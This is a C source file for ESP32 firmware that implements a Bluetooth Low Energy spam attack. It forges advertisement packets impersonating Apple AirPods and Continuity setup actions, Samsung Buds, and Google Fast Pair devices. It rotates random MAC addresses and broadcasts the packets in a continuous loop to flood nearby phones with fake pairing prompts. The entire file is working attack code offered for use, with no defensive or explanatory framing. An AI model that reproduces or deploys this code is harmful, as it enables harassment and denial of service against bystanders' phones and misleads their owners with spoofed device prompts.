/**
 * @file attack_bt_spam.c
 * @author Raghu Saxena (poiasdpoiasd@live.com) and Willy-JL, ECTO-1A, Spooks4576
 * @brief BLE Spam Attack
 *
 */

#include "attack_bt_spam.h"
#include <string.h>
#include <stdlib.h>
#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
#include "esp_log.h"
#include "esp_random.h"
#include "esp_timer.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/semphr.h"

// NimBLE headers
#include "host/ble_gap.h"
#include "host/ble_hs.h"
#include "nimble/ble.h"
#include "nimble/nimble_port.h"
#include "nimble/nimble_port_freertos.h"

static const char *TAG = "attack_bt_spam";


static const uint16_t apple_audio_models[] = {
    0x0E20, 0x0A20, 0x0220, 0x0F20, 0x1320, 0x1420,
    0x1020, 0x0620, 0x0320, 0x0B20, 0x0C20, 0x1120,
    0x0520, 0x0920, 0x1720, 0x1220, 0x1620, 0x0055, 0x0030,
};
#define APPLE_AUDIO_MODEL_COUNT (sizeof(apple_audio_models)/sizeof(apple_audio_models[0]))

static const uint8_t apple_setup_actions[] = {
    0x13, 0x24, 0x27, 0x20, 0x19, 0x1E, 0x09, 0x02, 0x0B, 0x01, 0x06, 0x0D, 0x2B,
};
#define APPLE_SETUP_ACTION_COUNT (sizeof(apple_setup_actions)/sizeof(apple_setup_actions[0]))


static const uint32_t samsung_buds_models[] = {
    0xEE7A0C, 0x9D1700, 0x39EA48, 0xA7C62C, 0x850116,
    0x3D8F41, 0x3B6D02, 0xAE063C, 0xB8B905, 0xEAAA17,
    0xD30704, 0x9DB006, 0x101F1A, 0x859608, 0x8E4503,
    0x2C6740, 0x3F6718, 0x42C519, 0xAE073A, 0x011716,
};
#define SAMSUNG_BUDS_MODEL_COUNT (sizeof(samsung_buds_models)/sizeof(samsung_buds_models[0]))


static const uint32_t fastpair_models[] = {
    0xCD8256, 0x0000F0, 0x821F66, 0xF52494, 0x718FA4,
    0x92BBBD, 0xD446A7, 0x2D7A23, 0x9ADB11, 0x8B66AB, 0xD99CA1,
};
#define FASTPAIR_MODEL_COUNT (sizeof(fastpair_models)/sizeof(fastpair_models[0]))

#define ADV_DURATION_APPLE_MS   200
#define ADV_DURATION_OTHER_MS   100
#define IDLE_AFTER_APPLE_MS      15
#define IDLE_AFTER_OTHER_MS      20


static bool initialized = false;
static bool running = false;
static TaskHandle_t task_handle = NULL;
static TaskHandle_t nimble_host_task_handle = NULL;
static SemaphoreHandle_t task_exit_sem = NULL;




static size_t gen_apple_audio(uint8_t *buf) {
    uint16_t model  = apple_audio_models[esp_random() % APPLE_AUDIO_MODEL_COUNT];
    uint8_t  prefix = (model == 0x0055 || model == 0x0030)
    ? 0x05
    : ((esp_random() % 2) ? 0x07 : 0x01);
    uint8_t  color  = esp_random() % 16;

    uint8_t i = 0;

    buf[i++] = 0x1E;
    buf[i++] = 0xFF;        // Manufacturer Specific
    buf[i++] = 0x4C;        // Apple Inc. company ID (little-endian)
    buf[i++] = 0x00;
    buf[i++] = 0x07;        // ContinuityTypeProximityPair
    buf[i++] = 0x19;        // data length = 25

    buf[i++] = prefix;
    buf[i++] = (model >> 8) & 0xFF;
    buf[i++] = (model >> 0) & 0xFF;
    buf[i++] = 0x55;        // status
    buf[i++] = ((esp_random() % 10) << 4) | (esp_random() % 10); // buds battery
    buf[i++] = ((esp_random() % 8)  << 4) | (esp_random() % 10); // case + charge
    buf[i++] = esp_random() & 0xFF; // lid open counter
    buf[i++] = color;
    buf[i++] = 0x00;
    esp_fill_random(&buf[i], 16);
    i += 16;
    return i; // 31
}


static size_t gen_apple_setup(uint8_t *buf) {
    uint8_t action = apple_setup_actions[esp_random() % APPLE_SETUP_ACTION_COUNT];
    uint8_t flags  = 0xC0;
    if (action == 0x20 && (esp_random() % 2)) flags--;
    if (action == 0x09 && (esp_random() % 2)) flags = 0x40;

    uint8_t i = 0;
    buf[i++] = 0x0A;        // AD length = 10
    buf[i++] = 0xFF;        // Manufacturer Specific
    buf[i++] = 0x4C;        // Apple Inc.
    buf[i++] = 0x00;
    buf[i++] = 0x0F;        // ContinuityTypeNearbyAction
    buf[i++] = 0x05;        // data length = 5
    buf[i++] = flags;
    buf[i++] = action;
    esp_fill_random(&buf[i], 3); // fake auth tag
    i += 3;
    return i; // 11
}


static size_t gen_samsung_buds(uint8_t *buf) {
    uint32_t model = samsung_buds_models[esp_random() % SAMSUNG_BUDS_MODEL_COUNT];

    uint8_t i = 0;


    buf[i++] = 27;          // AD length
    buf[i++] = 0xFF;        // Manufacturer Specific
    buf[i++] = 0x75;        // Samsung Electronics Co. Ltd.
    buf[i++] = 0x00;
    buf[i++] = 0x42;
    buf[i++] = 0x09;
    buf[i++] = 0x81;
    buf[i++] = 0x02;
    buf[i++] = 0x14;
    buf[i++] = 0x15;
    buf[i++] = 0x03;
    buf[i++] = 0x21;
    buf[i++] = 0x01;
    buf[i++] = 0x09;
    buf[i++] = (model >> 16) & 0xFF; // buds color/model byte 0
    buf[i++] = (model >>  8) & 0xFF; // buds color/model byte 1
    buf[i++] = 0x01;                 // always static
    buf[i++] = (model >>  0) & 0xFF; // buds color/model byte 2
    buf[i++] = 0x06;
    buf[i++] = 0x3C;
    buf[i++] = 0x94;
    buf[i++] = 0x8E;
    buf[i++] = 0x00;
    buf[i++] = 0x00;
    buf[i++] = 0x00;
    buf[i++] = 0x00;
    buf[i++] = 0xC7;
    buf[i++] = 0x00;

    buf[i++] = 0x10;        // AD length = 16 (Android pads the rest)
    buf[i++] = 0xFF;        // Manufacturer Specific
    buf[i++] = 0x75;        // Samsung
    // i = 31 here

    return i;
}


static size_t gen_fastpair(uint8_t *buf) {
    uint32_t model = fastpair_models[esp_random() % FASTPAIR_MODEL_COUNT];

    uint8_t i = 0;

    buf[i++] = 3;
    buf[i++] = 0x03;
    buf[i++] = 0x2C;
    buf[i++] = 0xFE;


    buf[i++] = 6;
    buf[i++] = 0x16;
    buf[i++] = 0x2C;
    buf[i++] = 0xFE;
    buf[i++] = (model >> 16) & 0xFF;
    buf[i++] = (model >>  8) & 0xFF;
    buf[i++] = (model >>  0) & 0xFF;


    buf[i++] = 2;
    buf[i++] = 0x0A;
    buf[i++] = (uint8_t)((esp_random() % 120) - 100); // -100 to +19 dBm

    return i; // 14
}



static void set_random_mac(void) {
    uint8_t mac[6];
    esp_fill_random(mac, 6);
    mac[5] |= 0xC0;
    ble_hs_id_set_rnd(mac);
}


static bool is_apple_type(int t) {
    return (t >= 1 && t <= 13);
}


static void nimble_host_task_fn(void *param) {
    ESP_LOGI(TAG, "NimBLE host task started");
    nimble_port_run();
    ESP_LOGI(TAG, "NimBLE host task exiting");
    nimble_port_freertos_deinit();
    vTaskDelete(NULL);
}


static void ble_on_sync(void) {
    ESP_LOGI(TAG, "NimBLE host synced");
}

static void ble_on_reset(int reason) {
    ESP_LOGE(TAG, "NimBLE host reset, reason=%d", reason);
}


static void spam_task(void *arg) {
    bt_spam_config_t *c = (bt_spam_config_t *)arg;
    uint32_t count    = 0;
    uint8_t  adv_raw[31];
    size_t   adv_raw_len;

    ESP_LOGI(TAG, "BLE SPAM STARTED - Device type: %d", c->device_type);


    while (running) {

        if (ble_gap_adv_active()) {
            ble_gap_adv_stop();
            vTaskDelay(pdMS_TO_TICKS(20));
        }

        bool apple = is_apple_type(c->device_type);


        if (!apple) {
            set_random_mac();
            vTaskDelay(pdMS_TO_TICKS(10));
        }


        int t = c->device_type;
        if (t >= 1 && t <= 8) {
            adv_raw_len = gen_apple_audio(adv_raw);
        } else if (t >= 9 && t <= 13) {
            adv_raw_len = gen_apple_setup(adv_raw);
        } else if (t >= 14 && t <= 19) {
            adv_raw_len = gen_samsung_buds(adv_raw);
        } else if (t >= 20 && t <= 24) {
            adv_raw_len = gen_fastpair(adv_raw);
        } else {

            int r = esp_random() % 4;
            if (r == 0) {
                apple = true;
                adv_raw_len = gen_apple_audio(adv_raw);
            } else if (r == 1) {
                apple = true;
                adv_raw_len = gen_apple_setup(adv_raw);
            } else if (r == 2) {
                apple = false;
                adv_raw_len = gen_samsung_buds(adv_raw);
            } else {
                apple = false;
                adv_raw_len = gen_fastpair(adv_raw);
            }
        }


        int rc = ble_gap_adv_set_data(adv_raw, adv_raw_len);
        if (rc != 0) {
            ESP_LOGE(TAG, "ble_gap_adv_set_data failed: %d", rc);
            vTaskDelay(pdMS_TO_TICKS(50));
            continue;
        }


        struct ble_gap_adv_params adv_params;
        memset(&adv_params, 0, sizeof(adv_params));
        adv_params.conn_mode  = BLE_GAP_CONN_MODE_NON;
        adv_params.channel_map = 0x07;


        adv_params.disc_mode = apple ? BLE_GAP_DISC_MODE_GEN : BLE_GAP_DISC_MODE_NON;


        if (apple) {
            adv_params.itvl_min = 0x30; // ~30 ms
            adv_params.itvl_max = 0x40;
        } else {
            adv_params.itvl_min = 0x20; // ~20 ms
            adv_params.itvl_max = 0x28;
        }


        uint32_t adv_ms  = apple ? ADV_DURATION_APPLE_MS
        : (50 + (esp_random() % 50)); // 50-100 ms


        uint8_t own_addr_type = apple ? BLE_OWN_ADDR_PUBLIC : BLE_OWN_ADDR_RANDOM;

        rc = ble_gap_adv_start(own_addr_type, NULL, adv_ms, &adv_params, NULL, NULL);
        if (rc != 0) {
            ESP_LOGE(TAG, "ble_gap_adv_start failed: %d", rc);
            vTaskDelay(pdMS_TO_TICKS(50));
            continue;
        }

        count++;

        // Wait for the advertising window to finish
        vTaskDelay(pdMS_TO_TICKS(adv_ms + 20));

        if (ble_gap_adv_active()) {
            ble_gap_adv_stop();
        }

        // Short idle before next burst
        uint32_t idle_ms = apple ? IDLE_AFTER_APPLE_MS : IDLE_AFTER_OTHER_MS;
        // Optional extra delay from config
        idle_ms += (uint32_t)c->delay_ms;
        vTaskDelay(pdMS_TO_TICKS(idle_ms));

        if (count % 25 == 0) {
            ESP_LOGI(TAG, "Packets sent: %lu", count);
        }
    }


    if (ble_gap_adv_active()) {
        ble_gap_adv_stop();
    }

    ESP_LOGI(TAG, "BLE SPAM STOPPED | Total: %lu packets", count);
    running      = false;
    task_handle  = NULL;
    if (task_exit_sem) xSemaphoreGive(task_exit_sem);
    vTaskDelete(NULL);
}


void attack_bt_spam_init(void) {
    if (initialized) {
        ESP_LOGW(TAG, "Already initialized");
        return;
    }

    if (task_exit_sem == NULL) {
        task_exit_sem = xSemaphoreCreateBinary();
    }

    ble_hs_cfg.sync_cb  = ble_on_sync;
    ble_hs_cfg.reset_cb = ble_on_reset;

    int rc = nimble_port_init();
    if (rc != 0) {
        ESP_LOGE(TAG, "nimble_port_init failed: %d", rc);
        return;
    }

    xTaskCreate(nimble_host_task_fn, "nimble_host", 4096, NULL, 5, &nimble_host_task_handle);


    vTaskDelay(pdMS_TO_TICKS(200));
    int timeout = 50;
    while (!ble_hs_synced() && timeout-- > 0) {
        vTaskDelay(pdMS_TO_TICKS(100));
    }

    if (!ble_hs_synced()) {
        ESP_LOGE(TAG, "NimBLE sync timeout");
        return;
    }

    initialized = true;
    ESP_LOGI(TAG, "BLE spam initialized successfully");
}

void attack_bt_spam_start(bt_spam_config_t *c) {
    if (!initialized) {
        ESP_LOGE(TAG, "Not initialized! Call attack_bt_spam_init() first");
        return;
    }
    if (running) {
        ESP_LOGE(TAG, "Already running!");
        return;
    }
    if (!c) {
        ESP_LOGE(TAG, "Null config!");
        return;
    }

    if (task_exit_sem != NULL) {
        xSemaphoreTake(task_exit_sem, 0);
    }

    running = true;

    static bt_spam_config_t cfg;
    memcpy(&cfg, c, sizeof(cfg));

    BaseType_t ret = xTaskCreate(spam_task, "bt_spam", 4096, &cfg, 5, &task_handle);
    if (ret != pdPASS) {
        ESP_LOGE(TAG, "Failed to create spam task");
        running = false;
        return;
    }
}

void attack_bt_spam_stop(void) {
    if (!running && task_handle == NULL) return;

    running = false;

    if (task_exit_sem != NULL) {
        if (xSemaphoreTake(task_exit_sem, pdMS_TO_TICKS(3000)) != pdTRUE) {
            ESP_LOGW(TAG, "Task exit timeout, forcing delete");
            if (task_handle != NULL) {
                vTaskDelete(task_handle);
                task_handle = NULL;
            }
        }
    } else {
        vTaskDelay(pdMS_TO_TICKS(500));
        if (task_handle != NULL) {
            vTaskDelete(task_handle);
            task_handle = NULL;
        }
    }

    ESP_LOGI(TAG, "BLE spam stopped");
}

bool attack_bt_spam_is_running(void) {
    return running;
}
